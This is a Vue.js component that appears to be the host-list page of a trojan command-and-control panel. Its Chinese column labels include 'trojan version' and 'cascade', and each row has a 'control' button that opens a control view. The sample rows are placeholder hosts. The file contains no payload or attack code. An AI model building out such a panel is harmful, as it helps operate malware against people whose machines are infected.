<template>
<div id="host">
  <el-table
    ref="filterTable"
    :data="tableData"
    style="width: 100%"
    max-height="250"
  >
    <!-- <el-table-column fixed v-bind:prop="number" label="编号" width="60">
    </el-table-column> -->
    <el-table-column
      prop="tag"
      label="状态"
      width="100"
      :filters="[
        { text: 'On', value: 'On' },
        { text: 'Off', value: 'Off' },
      ]"
      :filter-method="filterTag"
      filter-placement="bottom-end"
    >
      <template slot-scope="scope">
        <el-tag
          :type="scope.row.tag === 'Off' ? 'danger' : 'success'"
          disable-transitions
          >{{ scope.row.tag }}</el-tag
        >
      </template>
    </el-table-column>
    <el-table-column prop="system" label="系统" width="120"> </el-table-column>
    <el-table-column prop="PCname" label="主机名" width="180">
    </el-table-column>
    <el-table-column prop="ip" label="IP" width="320"> </el-table-column>
    <el-table-column prop="muma" label="木马版本" width="120">
    </el-table-column>
    <el-table-column prop="cascade" label="级联" width="150"> </el-table-column>
    <el-table-column fixed="right" label="操作" width="130">
      <template>
        <el-button type="danger" size="small" @click="goControl()"
          >控制</el-button
        >
      </template>
    </el-table-column>
  </el-table>

  </div>
</template>

<script>
export default {
  name: "Host",

  methods: {
    handleClick(row) {
      console.log(row);
    },
    goControl() {
      // <router-link target="_blank to="/Control">控制</router-link>
      // this.$router.push("./Control/"+this.form.)
      let routeUrl = this.$router.resolve({
        path: "/Control" ,
      });
      window.open(routeUrl.href, "_blank");
    },
    filterTag(value, row) {
      return row.tag === value;
    },
    // get_jecoco_report(row) {
    //     url=this.$router.push("./Control")
    //     window.open(url);
    // },
  },

  data() {
    return {
      tableData: [
        {
          number: "1",
          tag: "On",
          system: "windows",
          PCname: "11111",
          ip: "192.168.1.3",
          muma: "1.0.1",
          cascade: "无",
        },
        {
          number: "2",
          tag: "Off",
          system: "",
          PCname: "",
          ip: "",
          muma: "",
          cascade: "与1级联",
        },
        {
          number: "3",
          tag: "",
          system: "",
          PCname: "",
          ip: "",
          muma: "",
          cascade: "",
        },
      ],
    };
  },
};
</script>
